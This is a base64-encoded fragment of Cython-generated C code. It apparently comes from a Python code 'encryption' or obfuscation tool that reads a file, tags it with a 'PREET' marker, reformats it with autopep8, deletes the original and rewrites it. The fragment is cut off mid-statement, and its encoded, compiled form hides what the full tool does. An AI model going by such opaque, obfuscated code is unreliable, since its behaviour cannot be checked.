X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnICh3cmFwcGVyKSIsIDApO1xuICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7XG4gICNlbHNlXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICNlbmRpZlxuICAjZW5kaWZcbiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7XG4gIHtcbiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uYW1lLDB9O1xuICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwO1xuICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgNDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHtcbiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA0NiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMDogYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgICB9XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzO1xuICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgImciLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAxOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJnIiwgMSwgMSwgMSwgaSk7IF9fUFlYX0VSUigwLCA0NiwgX19weXhfTDNfZXJyb3IpIH1cbiAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDEpKSB7XG4gICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgIH0gZWxzZSB7XG4gICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA0NiwgX19weXhfTDNfZXJyb3IpXG4gICAgfVxuICAgIF9fcHl4X3ZfbmFtZSA9IHZhbHVlc1swXTtcbiAgfVxuICBnb3RvIF9fcHl4X0w2X3NraXA7XG4gIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjtcbiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImciLCAxLCAxLCAxLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCA0NiwgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJucS5nIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gTlVMTDtcbiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6O1xuICBfX3B5eF9yID0gX19weXhfcGZfMm5xXzZnKF9fcHl4X3NlbGYsIF9fcHl4X3ZfbmFtZSk7XG5cbiAgXG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJucV82ZyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9uYW1lKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3cgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9hID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfYWEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9vdXRwdXRfZiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X25hbWUyID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZiA9IE5VTEw7XG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfbmFtZTJfYmFzZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF82O1xuICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzExID0gTlVMTDtcbiAgaW50IF9fcHl4X3RfMTI7XG4gIGludCBfX3B5eF90XzEzO1xuICBQeV9zc2l6ZV90IF9fcHl4X3RfMTQ7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE1ID0gTlVMTDtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZyIsIDApO1xuXG4gIFxuICBfX3B5eF90XzIgPSBOVUxMO1xuICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9vcGVuKTtcbiAgX19weXhfdF8zID0gX19weXhfYnVpbHRpbl9vcGVuOyBcbiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQ3LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9tLCBfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgX19weXhfdF82ID0gMTtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAxIDogMCldID0ge19fcHl4X3RfMiwgX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfcn07XG4gICAgX19weXhfdF80ID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDcsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VuY29kaW5nLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3V0Zl84LCBfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzKzMsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgNDcsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fcHl4X3RfMSA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDMtX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF80KTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDcsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICB9XG4gIF9fcHl4X3ZfdyA9IF9fcHl4X3RfMTtcbiAgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19weXhfdl93O1xuICBfX1B5eF9JTkNSRUYoX19weXhfdF8zKTtcbiAgX19weXhfdF82ID0gMDtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzMsIE5VTEx9O1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWFkLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgxLV9fcHl4X3RfNikgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDgsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICB9XG4gIF9fcHl4X3ZfYSA9IF9fcHl4X3RfMTtcbiAgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19weXhfdF8zID0gX19weXhfdl93O1xuICBfX1B5eF9JTkNSRUYoX19weXhfdF8zKTtcbiAgX19weXhfdF82ID0gMDtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzMsIE5VTEx9O1xuICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbG9zZSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMS1fX3B5eF90XzYpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQ5LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19weXhfdF8xID0gUHlOdW1iZXJfQWRkKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfVEhJU19FTkNPREVfQllfUFJFRVRfQmVhc3RlcmVuMSwgX19weXhfdl9hKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNTQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgX19QeXhfREVDUkVGX1NFVChfX3B5eF92X2EsIF9fcHl4X3RfMSk7XG4gIF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMyA9IE5VTEw7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTtcbiAgX19weXhfdF80ID0gX19weXhfYnVpbHRpbl9wcmludDsgXG4gIF9fcHl4X3RfNiA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzFfOTJtXzM4XzVfNDltRU5DUllQVElOR307XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA1NiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfNCA9IE5VTEw7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXV0b3BlcDgpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA1OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZpeF9jb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gIF9fcHl4X3RfNiA9IDE7XG4gICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNSkpKSB7XG4gICAgX19weXhfdF80ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTtcbiAgICBhc3NlcnQoX19weXhfdF80KTtcbiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzUsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19weXhfdF82ID0gMDtcbiAgfVxuICAjZW5kaWZcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X3ZfYX07XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA1OSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIH1cbiAgX19weXhfdl9hYSA9IF9fcHl4X3RfMTtcbiAgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19weXhfdF81ID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDYwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVtb3ZlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNjAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X25hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA2MCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX3B5eF90XzIgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfbSwgX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNjAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gIF9fcHl4X3RfNiA9IDE7XG4gICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMykpKSB7XG4gICAgX19weXhfdF81ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8zKTtcbiAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMyk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzMsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgX19weXhfdF82ID0gMDtcbiAgfVxuICAjZW5kaWZcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfMn07XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8zLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA2MCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG5cbiAgXG4gICB7XG4gICAgX19weXhfdF8zID0gTlVMTDtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9vcGVuKTtcbiAgICBfX3B5eF90XzIgPSBfX3B5eF9idWlsdGluX29wZW47IFxuICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X25hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA2MSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgX19weXhfdF80ID0gX19QeXhfUHlVbmljb2RlX0NvbmNhdChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X20sIF9fcHl4X3RfNSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDYxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX3B5eF90XzYgPSAxO1xuICAgIHtcbiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzMsIF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3d9O1xuICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgzLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDYxLCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIH1cbiAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2V4aXRfMik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDYxLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICBfX3B5eF90XzQgPSBOVUxMO1xuICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA2MSwgX19weXhfTDNfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgX19weXhfdF82ID0gMTtcbiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgaWYgKGxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzMpKSkge1xuICAgICAgX19weXhfdF80ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8zKTtcbiAgICAgIGFzc2VydChfX3B5eF90XzQpO1xuICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzMpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8zLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19weXhfdF82ID0gMDtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAge1xuICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgTlVMTH07XG4gICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDYxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgIH1cbiAgICBfX3B5eF90XzMgPSBfX3B5eF90XzI7XG4gICAgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYo